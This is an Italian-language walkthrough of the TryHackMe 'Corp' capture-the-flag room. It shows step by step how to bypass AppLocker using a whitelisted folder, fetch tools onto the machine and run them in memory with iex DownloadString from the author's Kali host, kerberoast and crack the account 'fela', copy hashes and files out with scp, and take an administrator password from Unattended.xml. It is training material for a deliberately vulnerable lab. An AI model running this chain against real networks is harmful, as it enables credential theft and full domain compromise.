#windows 

https://tryhackme.com/room/corp

Aggira Windows AppLocker e aumenta i tuoi privilegi. Imparerai a usare il kerberoasting, a eludere gli antivirus, a bypassare AppLocker e ad aumentare i tuoi privilegi su un sistema Windows.

In questa stanza imparerai quanto segue:

1. Analisi forense di Windows
2. Nozioni di base sul kerberoasting
3. AV Evading
4. Applocker

Si prega di notare che questa macchina non risponde al ping (ICMP) e potrebbe impiegare alcuni minuti per avviarsi.


### Bypassing Applocker

**AppLocker è una tecnologia di whitelisting delle applicazioni** introdotta con Windows 7. Consente di limitare i programmi che gli utenti possono eseguire in base al percorso, all'editore e all'hash dei programmi.

Avrai notato che con la macchina distribuita non puoi eseguire i tuoi file binari e che alcune funzioni del sistema saranno limitate.

Rispondi alle domande seguenti

**Esistono molti modi per aggirare AppLocker.**

Se AppLocker è configurato con le **regole AppLocker predefinite, possiamo ignorarlo posizionando il nostro eseguibile nella seguente directory:  C:\Windows\System32\spool\drivers\color** - Questa directory è inclusa nella whitelist per impostazione predefinita. 
```
cd C:\Windows\System32\spool\drivers\color
```
Procedi e **usa PowerShell per scaricare localmente un eseguibile** di tua scelta, posizionalo **nella directory autorizzata** ed eseguilo.

Prendiamo nota del nostro IP su Kali

per poter scaricare un file dalla nostra macchina kali , ci posizioniamo nella cartella dove risiede il nostro exe ed eseguiamo il nostro server
```
cd /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/
```
```
python -m SimpleHTTPServer 8080
```
facciamo shift+dx_mouse ed apri finestra Powershell 

```
Invoke-WebRequest -Uri "URL_DEL_FILE" -OutFile "PERCORSO_DOVE_SALVARE_IL_FILE"
```

```
Invoke-WebRequest -Uri "http://10.10.200.194:8080/nc.exe" -OutFile "nc.exe"
```

Proprio come la bash di Linux, **Windows PowerShell salva tutti i comandi precedenti in un file** chiamato  ConsoleHost_history .  Questo file si trova **in  %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ ConsoleHost_history.txt**

Accedi al file e ottieni il flag.

```
Get-Content C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
```
Suggestion [3,General]: The command nc.exe was not found, but does exist in the current location. Windows PowerShell does not load commands from the current location by default. If you trust this command, instead type: ".\nc.exe". See "get-help about_Command_Precedence" for more details.
PS C:\Windows\System32\spool\drivers\color> Get-Content C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
ls
dir
Get-Content test
flag{xxxx}
iex(new-object net.webclient).DownloadString('http://127.0.0.1/test.ps1')
cls
exit
```

```
flag{xxxxx}
```

### Kerberoasting

https://youtu.be/LmbP-XD1SC8

Kerberos è il sistema di autenticazione per le reti Windows e Active Directory. Esistono molti attacchi contro Kerberos . In questa sessione useremo uno script Powershell per richiedere un ticket di servizio per un account e acquisirne l'hash. Possiamo quindi decifrare questo hash per accedere a un altro account utente!

Per prima cosa enumeriamo Windows. Se eseguiamo
```
cmd
```

```
setspn -T medin -Q */*
```
possiamo estrarre tutti gli account nell'SPN.

SPN è il nome del servizio principale e rappresenta la mappatura tra servizio e account.

Eseguendo questo comando, troviamo un SPN esistente. A quale utente è destinato?

```
fela
```

Ora che abbiamo visto che esiste un SPN per un utente, possiamo usare Invoke-Kerberoast e ottenere un ticket.

Per prima cosa scarichiamo su kali Powershell  [Invoke-Kerberoast](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1) .
```
python3 -m http.server 8080
```

Su Windows
```
powershell -ep bypass;  
```

```
iex​(New-Object  Net.WebClient).DownloadString('http://10.14.99.134:8080/Invoke-Kerberoast.ps1') 
```

Ora carichiamolo in memoria:  
```
Invoke-Kerberoast -OutputFormat hashcat |fl
```

Dovresti procurarti un biglietto SPN.

mandiamo l'output ad un file hash.txt per trasferirlo successivamente su kali
```
Invoke-Kerberoast -OutputFormat hashcat |fl > hash.txt
```

su Kali (avviamo ssh se disabilitato)
```
sudo systemctl start ssh
```

su Windows
```
cmd
```
```
scp hash.txt kali@10.14.99.134:/home/kali/Downloads
```

su Kali
```
cat hash.txt
```
```
└─# cat hash.txt   
��

TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$7928C89DF2E57E0BA5BF7D7B8EDA1894$8FA1E14CC088A
                       452DC1057EB775651FFD1D890DC81708072535A5734AAB25DDFBC6A9AA555ED35CEAE9F371F1BB9C6209CD
                       2C3665ED9813531B1E01C10E94FFD4A0EB3DDBCC46D1A85C89185FF8DB006A4CF3A096251B2D4C06960E59
                       A4B0107844C0A53C7DED928D1D944CD0188796C4919E8CC6CE0A93CBDDDF0FA88EF88DEBD7AB385DEE8880
                       C9719BE5A70C3919EE811A8903069A253FF6C53C2B0FC5BAA5DC193E64152A9EB3C32AAC31CEB17702C408
                       A3A8B8429574DB2E1DA81D30B1B5C4A2E1DEC8968613B87A5FF4CCC5803DA76DC60012CFD94241F87461B4
                       11033240F38CAB61706678123A372281CED0E1CC1FAC836F882973EA05CED5416191023A03A398FD11254D
                       0861A1B1E6FF49144ECFF0DF6D0FD9F29143F8A0215A6D30EB5DDEE9AEFDADF269BE86EAB284D8D03608DC
                       371B22B407ACD574A160A02556379AB9CFC11BC9B778F283B8397B2E966D335FAED0C2663E3F954924F757
                       F456C39FF8465ABB200D151697BDBD6B837E19E10AF19C9BF6D29C87EA44BBC839928D527B71DC1B41B8E0
                       B3AAB7F812DAB4F363ECF33BFFA403FBC79D32640DBE3E5AA5B5BD021AA64EEAB98B14BE4A0AE6C17EFBEA
                       C92A8D687B8462AA343841A478FF5BF05CC56690E96E0A46581C653F8C9CC4689B937074FC8233BE6DB13B
                       24BA4BA20495A23257C5C0F433F0542419C74259D1D597B5106C593D9B0896829A04C0FF7DF359B20F5E4F
                       2E42537382FA678D76387C0323AF215188E218509320F547A0DF3DBAAC7E9062285F2DABE2EE28C7437065
                       6577BDB3BF9DA4C4257ECE02E49BF6F0B7C00EF301D052F1CBCD507CF78F0200B3514066FBCAFAE6488015
                       430245739D41A8DDBF0517EC79AF3611934D7CFAEA8BA2AB0410694D08A66C8AE21384399708B5D821FF70
                       0D8D7593407ED5F1BF95B14883B2CA9A73BB9A1E0323025FE9D4E2FC23D52180FF7F3D175A5F44D37B7315
                       4B279751ED585DE194189AAD5011A9C86F6A042D5CF48D57ACF24DA0133C64FE685B5F13B118C9B95AF96B
                       3891D890CBD41FC8102F0EA86A08E81F1417399C3CF9CE2388D3FE5C45A35A083E2DC62B3793199048D486
                       A725F70A2AE3C1174F5AB1F6B8671B29D2F2BBAAEC28CBFBE56D626FF4C6F5A75F9EFAAF6BF0E725B8AB33
                       F22D580403D85FB865F2353E2F93974611F167D63536E92C61AAEEE912C02B700D7FAEAA065C3B9B3C3511
                       2876D97E9A2E27644257F83BA438F2B301D7FF7DE49624FCC4572AAF9206C9EEC3D7815FE803FAE0956FAD
                       B648FAD7B335E1A6BDFC4ADEE351EB341C31E1BBC878CED5FBAD0664AC1F8236121E5FE5E6F4AE9AEE2D89
                       9E210D8F14A6242173DF02F354BDB749104FCF3DE0EF257069C86FA213364E78C8539CE85353A585F
SamAccountName       : fela
DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela

```

(Potevamo anche adoperare netcat che avevo precedentemente uploadato)
ora copiamo solo la chiave in un file 
```
nano hash1.txt
```
```
$krb5tgs$23$*fela$corp.local$HTTP/fela*$7928C89DF2E57E0BA5BF7D7B8EDA1894$8FA1E14CC088A452DC1057EB775651FFD1D890DC81708072535A5734AAB25DDFBC6A9AA555ED35CEAE9F371F1BB9C6209CD2C3665ED9813531B1E01C10E94FFD4A0EB3DDBCC46D1A85C89185FF8DB006A4CF3A096251B2D4C06960E59A4B0107844C0A53C7DED928D1D944CD0188796C4919E8CC6CE0A93CBDDDF0FA88EF88DEBD7AB385DEE8880C9719BE5A70C3919EE811A8903069A253FF6C53C2B0FC5BAA5DC193E64152A9EB3C32AAC31CEB17702C408A3A8B8429574DB2E1DA81D30B1B5C4A2E1DEC8968613B87A5FF4CCC5803DA76DC60012CFD94241F87461B411033240F38CAB61706678123A372281CED0E1CC1FAC836F882973EA05CED5416191023A03A398FD11254D0861A1B1E6FF49144ECFF0DF6D0FD9F29143F8A0215A6D30EB5DDEE9AEFDADF269BE86EAB284D8D03608DC371B22B407ACD574A160A02556379AB9CFC11BC9B778F283B8397B2E966D335FAED0C2663E3F954924F757F456C39FF8465ABB200D151697BDBD6B837E19E10AF19C9BF6D29C87EA44BBC839928D527B71DC1B41B8E0B3AAB7F812DAB4F363ECF33BFFA403FBC79D32640DBE3E5AA5B5BD021AA64EEAB98B14BE4A0AE6C17EFBEAC92A8D687B8462AA343841A478FF5BF05CC56690E96E0A46581C653F8C9CC4689B937074FC8233BE6DB13B24BA4BA20495A23257C5C0F433F0542419C74259D1D597B5106C593D9B0896829A04C0FF7DF359B20F5E4F2E42537382FA678D76387C0323AF215188E218509320F547A0DF3DBAAC7E9062285F2DABE2EE28C74370656577BDB3BF9DA4C4257ECE02E49BF6F0B7C00EF301D052F1CBCD507CF78F0200B3514066FBCAFAE6488015430245739D41A8DDBF0517EC79AF3611934D7CFAEA8BA2AB0410694D08A66C8AE21384399708B5D821FF700D8D7593407ED5F1BF95B14883B2CA9A73BB9A1E0323025FE9D4E2FC23D52180FF7F3D175A5F44D37B73154B279751ED585DE194189AAD5011A9C86F6A042D5CF48D57ACF24DA0133C64FE685B5F13B118C9B95AF96B3891D890CBD41FC8102F0EA86A08E81F1417399C3CF9CE2388D3FE5C45A35A083E2DC62B3793199048D486A725F70A2AE3C1174F5AB1F6B8671B29D2F2BBAAEC28CBFBE56D626FF4C6F5A75F9EFAAF6BF0E725B8AB33F22D580403D85FB865F2353E2F93974611F167D63536E92C61AAEEE912C02B700D7FAEAA065C3B9B3C35112876D97E9A2E27644257F83BA438F2B301D7FF7DE49624FCC4572AAF9206C9EEC3D7815FE803FAE0956FADB648FAD7B335E1A6BDFC4ADEE351EB341C31E1BBC878CED5FBAD0664AC1F8236121E5FE5E6F4AE9AEE2D899E210D8F14A6242173DF02F354BDB749104FCF3DE0EF257069C86FA213364E78C8539CE85353A585F
```
Usiamo hashcat per forzare brutamente questa password. Il tipo di hash che stiamo violando è  Kerberos 5 TGS-REP etype 23 e il codice hashcat per questo è 13100 .

```
hashcat -m 13100 -​a 0 hash1.txt wordlist --force
```

Decifra l'hash. Qual è la password dell'utente in chiaro?

```
hashcat -m 13100 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt --force 
```

```
$krb5tgs$23$*fela$corp.local$HTTP/fela*$7928c89df2e57e0ba5bf7d7b8eda1894$8fa1e14cc088a452dc1057eb775651ffd1d890dc81708072535a5734aab25ddfbc6a9aa555ed35ceae9f371f1bb9c6209cd2c3665ed9813531b1e01c10e94ffd4a0eb3ddbcc46d1a85c89185ff8db006a4cf3a096251b2d4c06960e59a4b0107844c0a53c7ded928d1d944cd0188796c4919e8cc6ce0a93cbdddf0fa88ef88debd7ab385dee8880c9719be5a70c3919ee811a8903069a253ff6c53c2b0fc5baa5dc193e64152a9eb3c32aac31ceb17702c408a3a8b8429574db2e1da81d30b1b5c4a2e1dec8968613b87a5ff4ccc5803da76dc60012cfd94241f87461b411033240f38cab61706678123a372281ced0e1cc1fac836f882973ea05ced5416191023a03a398fd11254d0861a1b1e6ff49144ecff0df6d0fd9f29143f8a0215a6d30eb5ddee9aefdadf269be86eab284d8d03608dc371b22b407acd574a160a02556379ab9cfc11bc9b778f283b8397b2e966d335faed0c2663e3f954924f757f456c39ff8465abb200d151697bdbd6b837e19e10af19c9bf6d29c87ea44bbc839928d527b71dc1b41b8e0b3aab7f812dab4f363ecf33bffa403fbc79d32640dbe3e5aa5b5bd021aa64eeab98b14be4a0ae6c17efbeac92a8d687b8462aa343841a478ff5bf05cc56690e96e0a46581c653f8c9cc4689b937074fc8233be6db13b24ba4ba20495a23257c5c0f433f0542419c74259d1d597b5106c593d9b0896829a04c0ff7df359b20f5e4f2e42537382fa678d76387c0323af215188e218509320f547a0df3dbaac7e9062285f2dabe2ee28c74370656577bdb3bf9da4c4257ece02e49bf6f0b7c00ef301d052f1cbcd507cf78f0200b3514066fbcafae6488015430245739d41a8ddbf0517ec79af3611934d7cfaea8ba2ab0410694d08a66c8ae21384399708b5d821ff700d8d7593407ed5f1bf95b14883b2ca9a73bb9a1e0323025fe9d4e2fc23d52180ff7f3d175a5f44d37b73154b279751ed585de194189aad5011a9c86f6a042d5cf48d57acf24da0133c64fe685b5f13b118c9b95af96b3891d890cbd41fc8102f0ea86a08e81f1417399c3cf9ce2388d3fe5c45a35a083e2dc62b3793199048d486a725f70a2ae3c1174f5ab1f6b8671b29d2f2bbaaec28cbfbe56d626ff4c6f5a75f9efaaf6bf0e725b8ab33f22d580403d85fb865f2353e2f93974611f167d63536e92c61aaeee912c02b700d7faeaa065c3b9b3c35112876d97e9a2e27644257f83ba438f2b301d7ff7de49624fcc4572aaf9206c9eec3d7815fe803fae0956fadb648fad7b335e1a6bdfc4adee351eb341c31e1bbc878ced5fbad0664ac1f8236121e5fe5e6f4ae9aee2d899e210d8f14a6242173df02f354bdb749104fcf3de0ef257069c86fa213364e78c8539ce85353a585f:rubenF124
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*fela$corp.local$HTTP/fela*$7928c89df2e...3a585f
Time.Started.....: Tue Sep 30 05:55:55 2025, (3 secs)
Time.Estimated...: Tue Sep 30 05:55:58 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1182.0 kH/s (1.91ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4134912/14344385 (28.83%)
Rejected.........: 0/4134912 (0.00%)
Restore.Point....: 4131840/14344385 (28.80%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: rubichato -> rtrcrcs*
Hardware.Mon.#1..: Util: 66%

Started: Tue Sep 30 05:55:54 2025
Stopped: Tue Sep 30 05:55:59 2025
```
Decifra l'hash. Qual è la password dell'utente in chiaro?
```
rubenF124
```

Ora che abbiamo le credenziali di **fela** ci colleghiamo in rdp

```
xfreerdp3 /p:'rubenF124' /u:'corp\fela' /v:10.10.45.52
```

Accedi come questo utente. Qual è la sua bandiera?
e sul desktop abbiamo la prima flag
```
flag{bde1642535aa396d2439d86fe54a36e4}
```

### Escalation dei privilegi

tilizzeremo uno script di enumerazione di PowerShell per esaminare il computer Windows. Potremo quindi determinare il modo migliore per ottenere l'accesso come amministratore.

Rispondi alle domande seguenti

Eseguiremo  [PowerUp1.ps1](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1) nella memoria  per enumerare qualsiasi debolezza che possa essere sfruttata per l'escalation dei privilegi locali .  

da kali scarichiamo
```
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
```

```
python3 -m http.server 8081
```

ora su windows

```
powershell -ep bypass;
```

```
iex​(New-Object Net.WebClient).DownloadString('http://IL_TUO_IP /PowerUp.ps1')   
```

```
iex(New-Object Net.WebClient).DownloadString('http://10.14.99.134:8081/PowerUp.ps1')
```
dopo un po di tentativi lo scarico con il comando
```
Invoke-WebRequest -Uri "http://10.14.99.134:8081/PowerUp.ps1" -OutFile "PowerUp.ps1"
```
poi in sequenza questi due comandi
```
. .\PowerUp.ps1
```
```
Invoke-AllChecks
```
	 funzione Invoke-AllChecks da PowerUp per iniziare l'enumerazione del sistema

Lo script ha identificato diversi modi per ottenere l'accesso come amministratore. Il primo è bypassare l'**UAC** e il secondo è **UnattendedPath**. Sfrutteremo il metodo UnattendedPath.

```
c:\windows\Panther\Unattend\Unattended.xml
```
Questo è un file d'installazione di windows non presidiato spesso contiene credenziali
```
Get-Content  c:\windows\Panther\Unattend\Unattended.xml
```

per comodità lo scarichiamo in kali

```
scp c:\windows\Panther\Unattend\Unattended.xml kali@10.14.99.134:/home/kali/Downloads
```

```
cat Unattended.xml
```
```
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cat Unattended.xml     
<AutoLogon>
    <Password>
        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>    
```

"L'installazione automatica è il metodo con cui i produttori di apparecchiature originali (OEM), le aziende e altri utenti installano Windows NT in modalità automatica." Per saperne di più, clicca [qui](https://support.microsoft.com/en-us/topic/77504e1d-2b75-5be1-3eef-cec3617cc461) .

È anche il luogo in cui vengono memorizzate le password degli utenti con codifica Base64. Vai a C:\Windows\Panther\Unattend\Unattended.xml .

```
dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ
```

```
echo "dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ" | base64 --decode
```
ed abbiamo la password d'Amministratore
Qual è la password decodificata?
```
tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
```

```
xfreerdp3 /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' /u:'corp\administrator' /v:10.10.45.52
```

Ci chiede di modificare la password con una nuova possiamo sostituirla oppure bypassare collegandoci con

```
evil-winrm -u 'corp\administrator' -p 'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' -i 10.10.45.52
```

```
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/10/2019  11:01 AM             29 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
THM{xxxxxxxxx}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
ultima flag!
```
THM{xxxxxxxxx}
```